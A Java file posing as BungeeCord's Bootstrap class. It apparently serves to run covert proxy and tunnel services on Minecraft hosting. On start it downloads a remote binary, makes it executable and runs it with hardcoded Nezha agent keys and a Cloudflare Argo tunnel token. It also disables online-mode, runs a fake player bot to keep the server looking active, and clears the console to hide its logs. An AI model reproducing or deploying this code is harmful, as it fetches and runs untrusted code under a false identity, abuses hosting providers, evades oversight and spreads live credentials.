package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.lang.reflect.Field;

public class Bootstrap
{
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";

    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static Process minecraftProcess;
    private static Thread fakePlayerThread;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "MC_JAR", "MC_MEMORY", "MC_ARGS", "MC_PORT", 
        "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME", "FAKE_PLAYER_ACTIVITY"
    };

    public static void main(String[] args) throws Exception
    {
        // 移除版本检查防止报错
        System.out.println(ANSI_GREEN + "Starting Bootstrap (Original Fix)..." + ANSI_RESET);

        try {
            Map<String, String> config = loadEnvVars();
            
            // Step 1: Start SBX binary
            runSbxBinary(config);
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "SBX Services are running!" + ANSI_RESET);
            
            // Step 2: Start Minecraft server
            if (isMcServerEnabled(config)) {
                startMinecraftServer(config);
                System.out.println(ANSI_YELLOW + "\n[MC-Server] Waiting for server to fully start..." + ANSI_RESET);
                Thread.sleep(30000);
            }
            
            // Step 3: Start fake player
            if (isFakePlayerEnabled(config)) {
                System.out.println(ANSI_YELLOW + "\n[FakePlayer] Preparing to connect..." + ANSI_RESET);
                waitForServerReady(config);
                startFakePlayerBot(config);
            }
            
            System.out.println(ANSI_GREEN + "\nThank you for using this script, Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds..." + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
        
        while (running.get()) {
            try {
                Thread.sleep(10000);
            } catch (InterruptedException e) {
                break;
            }
        }
    }
    
    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception e) {}
    }   
    
    private static void runSbxBinary(Map<String, String> envVars) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();
    }
    
    private static Map<String, String> loadEnvVars() throws IOException {
        Map<String, String> envVars = new HashMap<>();
        
        // Default values
        envVars.put("UUID", "1f6b80fe-023a-4735-bafd-4c8512bf7e58");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "mbb.svip888.us.kg:53100");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "VnrTnhgoack6PhnRH6lyshe4OVkHmPyM");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "cloudb.lnb.gv.uy");
        envVars.put("ARGO_AUTH", "eyJhIjoiMGU3ZjI2MWZiY2ExMzcwNzZhNGZmODcxMzU3ZjYzNGQiLCJ0IjoiODJiMzY3OGYtYjdmMC00NjY5LThjNmMtOWJjNzBkODZjOGM0IiwicyI6Ik5qZGhNbVJsTlRjdFltRmtNUzAwTWpneUxXRmlORFF0TTJWbVltUXpPR05oTkRneSJ9");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "store.ubi.com");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "Mc");
        envVars.put("DISABLE_ARGO", "false");
        
        // Minecraft server settings
        envVars.put("MC_JAR", "server99.jar");
        envVars.put("MC_MEMORY", "512M");
        envVars.put("MC_ARGS", "");
        envVars.put("MC_PORT", "15017");
        envVars.put("FAKE_PLAYER_ENABLED", "true");
        envVars.put("FAKE_PLAYER_NAME", "laohu");
        envVars.put("FAKE_PLAYER_ACTIVITY", "high");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            try (BufferedReader reader = Files.newBufferedReader(envFile)) {
                String line;
                while ((line = reader.readLine()) != null) {
                    line = line.trim();
                    if (line.isEmpty() || line.startsWith("#")) continue;
                    if (line.startsWith("export ")) line = line.substring(7).trim();
                    String[] parts = line.split("=", 2);
                    if (parts.length == 2) {
                        String key = parts[0].trim();
                        String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                        if (Arrays.asList(ALL_ENV_VARS).contains(key)) envVars.put(key, value); 
                    }
                }
            }
        }
        return envVars;
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (minecraftProcess != null && minecraftProcess.isAlive()) {
            System.out.println(ANSI_YELLOW + "[MC-Server] Stopping..." + ANSI_RESET);
            minecraftProcess.destroy();
        }
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
        }
        if (fakePlayerThread != null && fakePlayerThread.isAlive()) {
            fakePlayerThread.interrupt();
        }
    }
    
    private static boolean isMcServerEnabled(Map<String, String> config) {
        String jarName = config.get("MC_JAR");
        return jarName != null && !jarName.trim().isEmpty();
    }
    
    private static void startMinecraftServer(Map<String, String> config) throws Exception {
        String jarName = config.get("MC_JAR");
        String memory = config.getOrDefault("MC_MEMORY", "512M");
        String extraArgs = config.getOrDefault("MC_ARGS", "");
        
        String mcPortStr = config.get("MC_PORT");
        int mcPort = 25565;
        try { mcPort = Integer.parseInt(mcPortStr.trim()); } catch (NumberFormatException e) {}
        config.put("MC_PORT", String.valueOf(mcPort));
        
        if (!memory.matches("\\d+[MG]")) memory = "512M";
        
        Path jarPath = Paths.get(jarName);
        if (!Files.exists(jarPath)) {
            System.out.println(ANSI_RED + "[MC-Server] Error: " + jarName + " not found!" + ANSI_RESET);
            return;
        }
        
        Path eulaPath = Paths.get("eula.txt");
        if (!Files.exists(eulaPath)) Files.write(eulaPath, "eula=true".getBytes());
        else if (!new String(Files.readAllBytes(eulaPath)).contains("eula=true")) Files.write(eulaPath, "eula=true".getBytes());
        
        Path propPath = Paths.get("server.properties");
        String props = Files.exists(propPath) ? new String(Files.readAllBytes(propPath)) : "server-port=" + mcPort + "\nonline-mode=false\n";
        
        if (!props.contains("server-port=")) props += "\nserver-port=" + mcPort + "\n";
        else props = props.replaceAll("server-port=\\d+", "server-port=" + mcPort);
        
        if (!props.contains("online-mode=")) props += "online-mode=false\n";
        else props = props.replace("online-mode=true", "online-mode=false");
        
        Files.write(propPath, props.getBytes());
        
        System.out.println(ANSI_GREEN + "\n=== Starting Minecraft Server ===" + ANSI_RESET);
        List<String> cmd = new ArrayList<>();
        cmd.add("java");
        cmd.add("-Xms" + memory);
        cmd.add("-Xmx" + memory);
        if (!extraArgs.trim().isEmpty()) cmd.addAll(Arrays.asList(extraArgs.split("\\s+")));
        cmd.add("-jar");
        cmd.add(jarName);
        cmd.add("nogui");
        
        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.redirectErrorStream(true);
        minecraftProcess = pb.start();
        
        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(minecraftProcess.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) System.out.println("[MC-Server] " + line);
            } catch (IOException e) {}
        }).start();
        
        Thread.sleep(3000);
        if (minecraftProcess.isAlive()) System.out.println(ANSI_GREEN + "[MC-Server] ✓ Started successfully on port " + mcPort + ANSI_RESET);
    }
    
    private static int parseMemory(String memory) {
        try {
            memory = memory.toUpperCase().trim();
            if (memory.endsWith("G")) return Integer.parseInt(memory.substring(0, memory.length() - 1)) * 1024;
            else if (memory.endsWith("M")) return Integer.parseInt(memory.substring(0, memory.length() - 1));
        } catch (Exception e) {}
        return 512;
    }
    
    private static boolean isFakePlayerEnabled(Map<String, String> config) {
        String enabled = config.get("FAKE_PLAYER_ENABLED");
        return enabled != null && enabled.equalsIgnoreCase("true");
    }
    
    private static void waitForServerReady(Map<String, String> config) throws InterruptedException {
        int mcPort = getMcPort(config);
        System.out.println(ANSI_YELLOW + "[FakePlayer] Checking server status on port " + mcPort + "..." + ANSI_RESET);
        for (int i = 0; i < 60; i++) {
            try {
                Thread.sleep(5000);
                try (Socket testSocket = new Socket()) {
                    testSocket.connect(new InetSocketAddress("127.0.0.1", mcPort), 3000);
                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Server port " + mcPort + " is ready!" + ANSI_RESET);
                    Thread.sleep(10000);
                    return;
                }
            } catch (Exception e) {}
        }
        System.out.println(ANSI_RED + "[FakePlayer] Warning: Timeout, trying anyway..." + ANSI_RESET);
    }
    
    private static int getMcPort(Map<String, String> config) {
        try { return Integer.parseInt(config.get("MC_PORT").trim()); } catch (Exception e) { return 25565; }
    }
    
    private static void startFakePlayerBot(Map<String, String> config) {
        String playerName = config.getOrDefault("FAKE_PLAYER_NAME", "Steve");
        int mcPort = getMcPort(config);
        String activityLevel = config.getOrDefault("FAKE_PLAYER_ACTIVITY", "high");
        
        System.out.println(ANSI_GREEN + "[FakePlayer] Starting fake player bot: " + playerName + ANSI_RESET);
        fakePlayerThread = new Thread(() -> {
            int actionCount = 0;
            while (running.get()) {
                Socket socket = null;
                try {
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Connecting..." + ANSI_RESET);
                    socket = new Socket();
                    socket.setReceiveBufferSize(10 * 1024 * 1024);
                    socket.connect(new InetSocketAddress("127.0.0.1", mcPort), 5000);
                    socket.setSoTimeout(60000);
                    DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                    DataInputStream in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
                    
                    // Handshake
                    ByteArrayOutputStream handshakeBuf = new ByteArrayOutputStream();
                    DataOutputStream handshake = new DataOutputStream(handshakeBuf);
                    writeVarInt(handshake, 0x00);
                    writeVarInt(handshake, 767); // 修改：767 (1.21.1)
                    writeString(handshake, "127.0.0.1");
                    handshake.writeShort(mcPort);
                    writeVarInt(handshake, 2);
                    byte[] handshakeData = handshakeBuf.toByteArray();
                    writeVarInt(out, handshakeData.length);
                    out.write(handshakeData);
                    out.flush();
                    
                    // Login
                    ByteArrayOutputStream loginBuf = new ByteArrayOutputStream();
                    DataOutputStream login = new DataOutputStream(loginBuf);
                    writeVarInt(login, 0x00);
                    writeString(login, playerName);
                    UUID playerUUID = UUID.nameUUIDFromBytes(("OfflinePlayer:" + playerName).getBytes("UTF-8"));
                    login.writeLong(playerUUID.getMostSignificantBits());
                    login.writeLong(playerUUID.getLeastSignificantBits());
                    byte[] loginData = loginBuf.toByteArray();
                    writeVarInt(out, loginData.length);
                    out.write(loginData);
                    out.flush();
                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Handshake & Login sent" + ANSI_RESET);
                    
                    boolean configPhase = false;
                    boolean playPhase = false;
                    boolean compressionEnabled = false;
                    int compressionThreshold = -1;
                    long lastActivityTime = System.currentTimeMillis();
                    long lastMajorActionTime = System.currentTimeMillis();
                    
                    while (running.get() && !socket.isClosed()) {
                        try {
                            int packetLength = readVarInt(in);
                            byte[] packetData = null;
                            if (compressionEnabled) {
                                int dataLength = readVarInt(in);
                                int compressedLength = packetLength - getVarIntSize(dataLength);
                                byte[] compressedData = new byte[compressedLength];
                                in.readFully(compressedData);
                                if (dataLength == 0) packetData = compressedData;
                                else if (dataLength <= 2097152) {
                                    java.util.zip.Inflater inflater = new java.util.zip.Inflater();
                                    inflater.setInput(compressedData);
                                    packetData = new byte[dataLength];
                                    inflater.inflate(packetData);
                                    inflater.end();
                                }
                            } else {
                                packetData = new byte[packetLength];
                                in.readFully(packetData);
                            }
                            if (packetData == null) continue;
                            
                            DataInputStream packetIn = new DataInputStream(new ByteArrayInputStream(packetData));
                            int packetId = readVarInt(packetIn);
                            
                            if (!playPhase) {
                                if (!configPhase) {
                                    if (packetId == 0x03) {
                                        compressionThreshold = readVarInt(packetIn);
                                        compressionEnabled = compressionThreshold >= 0;
                                        System.out.println(ANSI_YELLOW + "[FakePlayer] Compression: " + compressionThreshold + ANSI_RESET);
                                    } else if (packetId == 0x02) {
                                        System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Login Success" + ANSI_RESET);
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x03);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                        configPhase = true;
                                        
                                        ByteArrayOutputStream clientInfoBuf = new ByteArrayOutputStream();
                                        DataOutputStream info = new DataOutputStream(clientInfoBuf);
                                        writeVarInt(info, 0x00);
                                        writeString(info, "en_US");
                                        info.writeByte(10);
                                        writeVarInt(info, 0);
                                        info.writeBoolean(true);
                                        info.writeByte(127);
                                        writeVarInt(info, 1);
                                        info.writeBoolean(false);
                                        info.writeBoolean(true);
                                        // 1.21.1: 移除 ParticleStatus 字段
                                        // writeVarInt(info, 0); // Removed
                                        sendPacket(out, clientInfoBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                } else {
                                    if (packetId == 0x03) {
                                        System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Config Finished" + ANSI_RESET);
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x03);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                        playPhase = true;
                                        Thread.sleep(2000);
                                        performRandomAction(out, compressionEnabled, compressionThreshold, activityLevel);
                                    } else if (packetId == 0x04 && packetIn.available() >= 8) {
                                        long id = packetIn.readLong();
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x04);
                                        ack.writeLong(id);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                    } else if (packetId == 0x0E) {
                                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                        DataOutputStream bufOut = new DataOutputStream(buf);
                                        writeVarInt(bufOut, 0x07);
                                        writeVarInt(bufOut, 0);
                                        sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                }
                            } else {
                                long currentTime = System.currentTimeMillis();
                                if (packetId >= 0x20 && packetId <= 0x30 && packetIn.available() == 8) {
                                    long keepAliveId = packetIn.readLong();
                                    System.out.println(ANSI_GREEN + "[FakePlayer] ♥ Heartbeat (ID: 0x" + 
                                        Integer.toHexString(packetId) + ") Val: " + keepAliveId + 
                                        " [Actions: " + actionCount + "]" + ANSI_RESET);
                                    
                                    ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                    DataOutputStream bufOut = new DataOutputStream(buf);
                                    writeVarInt(bufOut, 0x15); // 修改：0x15 (1.21.1 KeepAlive)
                                    bufOut.writeLong(keepAliveId);
                                    sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                    
                                    double activityChance = getActivityChance(activityLevel);
                                    if (Math.random() < activityChance) {
                                        performRandomAction(out, compressionEnabled, compressionThreshold, activityLevel);
                                        actionCount++;
                                        lastActivityTime = currentTime;
                                    }
                                    if (currentTime - lastMajorActionTime > 180000) {
                                        performMajorActivity(out, compressionEnabled, compressionThreshold);
                                        lastMajorActionTime = currentTime;
                                    }
                                }
                                if (currentTime - lastActivityTime > 60000) {
                                    performRandomAction(out, compressionEnabled, compressionThreshold, activityLevel);
                                    actionCount++;
                                    lastActivityTime = currentTime;
                                }
                                if (packetId == 0x1D) {
                                    System.out.println(ANSI_RED + "[FakePlayer] Kicked" + ANSI_RESET);
                                    break;
                                }
                            }
                        } catch (java.net.SocketTimeoutException e) {
                            continue;
                        } catch (Exception e) {
                            break;
                        }
                    }
                    if (socket != null && !socket.isClosed()) try { socket.close(); } catch (Exception e) {}
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Reconnecting in 10s..." + ANSI_RESET);
                    Thread.sleep(10000);
                    actionCount = 0;
                } catch (java.net.ConnectException e) {
                    try { Thread.sleep(30000); } catch (InterruptedException ex) { break; }
                } catch (Exception e) {
                    try { Thread.sleep(10000); } catch (InterruptedException ex) { break; }
                }
            }
        });
        fakePlayerThread.setDaemon(true);
        fakePlayerThread.start();
    }
    
    private static double getActivityChance(String level) {
        switch(level.toLowerCase()) {
            case "low": return 0.2;
            case "medium": return 0.4;
            case "high": return 0.6;
            case "ultra": return 0.8;
            default: return 0.6;
        }
    }
    
    private static void performRandomAction(DataOutputStream out, boolean compress, int threshold, String level) {
        try {
            int actionType = (int)(Math.random() * 2);
            switch(actionType) {
                case 0:
                    ByteArrayOutputStream rotBuf = new ByteArrayOutputStream();
                    DataOutputStream rot = new DataOutputStream(rotBuf);
                    writeVarInt(rot, 0x18); // 修改：0x18 (1.21.1 Rotation)
                    rot.writeFloat((float)(Math.random() * 360));
                    rot.writeFloat((float)(Math.random() * 180 - 90));
                    rot.writeBoolean(true);
                    sendPacket(out, rotBuf.toByteArray(), compress, threshold);
                    System.out.println(ANSI_YELLOW + "[FakePlayer] → Turned head" + ANSI_RESET);
                    break;
                case 1:
                    ByteArrayOutputStream swingBuf = new ByteArrayOutputStream();
                    DataOutputStream swing = new DataOutputStream(swingBuf);
                    writeVarInt(swing, 0x31); // 修改：0x31 (1.21.1 Swing)
                    writeVarInt(swing, 0);
                    sendPacket(out, swingBuf.toByteArray(), compress, threshold);
                    System.out.println(ANSI_YELLOW + "[FakePlayer] → Swung arm" + ANSI_RESET);
                    break;
            }
        } catch (Exception e) {}
    }
    
    private static void performMajorActivity(DataOutputStream out, boolean compress, int threshold) {
        try {
            System.out.println(ANSI_GREEN + "[FakePlayer] ★ MAJOR ACTIVITY" + ANSI_RESET);
            Thread.sleep(100);
            
            ByteArrayOutputStream rotBuf = new ByteArrayOutputStream();
            DataOutputStream rot = new DataOutputStream(rotBuf);
            writeVarInt(rot, 0x18); // 0x18
            rot.writeFloat((float)(Math.random() * 360));
            rot.writeFloat((float)(Math.random() * 40 - 20));
            rot.writeBoolean(true);
            sendPacket(out, rotBuf.toByteArray(), compress, threshold);
            
            Thread.sleep(200);
            for (int i = 0; i < 5; i++) {
                ByteArrayOutputStream swingBuf = new ByteArrayOutputStream();
                DataOutputStream swing = new DataOutputStream(swingBuf);
                writeVarInt(swing, 0x31); // 0x31
                writeVarInt(swing, 0);
                sendPacket(out, swingBuf.toByteArray(), compress, threshold);
                Thread.sleep(250);
            }
            Thread.sleep(200);
            
            ByteArrayOutputStream rotBuf2 = new ByteArrayOutputStream();
            DataOutputStream rot2 = new DataOutputStream(rotBuf2);
            writeVarInt(rot2, 0x18); // 0x18
            rot2.writeFloat((float)(Math.random() * 360));
            rot2.writeFloat((float)(Math.random() * 40 - 20));
            rot2.writeBoolean(true);
            sendPacket(out, rotBuf2.toByteArray(), compress, threshold);
        } catch (Exception e) {}
    }
    
    private static int getVarIntSize(int value) {
        int size = 0;
        do {
            size++;
            value >>>= 7;
        } while (value != 0);
        return size;
    }
    
    private static void sendPacket(DataOutputStream out, byte[] packet, boolean compress, int threshold) throws IOException {
        if (!compress || packet.length < threshold) {
            if (compress) {
                ByteArrayOutputStream buf = new ByteArrayOutputStream();
                DataOutputStream bufOut = new DataOutputStream(buf);
                writeVarInt(bufOut, 0);
                bufOut.write(packet);
                byte[] finalPacket = buf.toByteArray();
                writeVarInt(out, finalPacket.length);
                out.write(finalPacket);
            } else {
                writeVarInt(out, packet.length);
                out.write(packet);
            }
        } else {
            byte[] compressedData = compressData(packet);
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            DataOutputStream bufOut = new DataOutputStream(buf);
            writeVarInt(bufOut, packet.length);
            bufOut.write(compressedData);
            byte[] finalPacket = buf.toByteArray();
            writeVarInt(out, finalPacket.length);
            out.write(finalPacket);
        }
        out.flush();
    }
    
    private static byte[] compressData(byte[] data) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        java.util.zip.Deflater deflater = new java.util.zip.Deflater();
        deflater.setInput(data);
        deflater.finish();
        byte[] buffer = new byte[1024];
        while (!deflater.finished()) {
            int count = deflater.deflate(buffer);
            out.write(buffer, 0, count);
        }
        deflater.end();
        return out.toByteArray();
    }
    
    private static void writeVarInt(DataOutputStream out, int value) throws IOException {
        while ((value & 0xFFFFFF80) != 0) {
            out.writeByte((value & 0x7F) | 0x80);
            value >>>= 7;
        }
        out.writeByte(value & 0x7F);
    }
    
    private static void writeString(DataOutputStream out, String str) throws IOException {
        byte[] bytes = str.getBytes("UTF-8");
        writeVarInt(out, bytes.length);
        out.write(bytes);
    }
    
    private static int readVarInt(DataInputStream in) throws IOException {
        int value = 0;
        int length = 0;
        byte currentByte;
        do {
            currentByte = in.readByte();
            value |= (currentByte & 0x7F) << (length * 7);
            length++;
            if (length > 5) throw new IOException("VarInt too big");
        } while ((currentByte & 0x80) == 0x80);
        return value;
    }
}
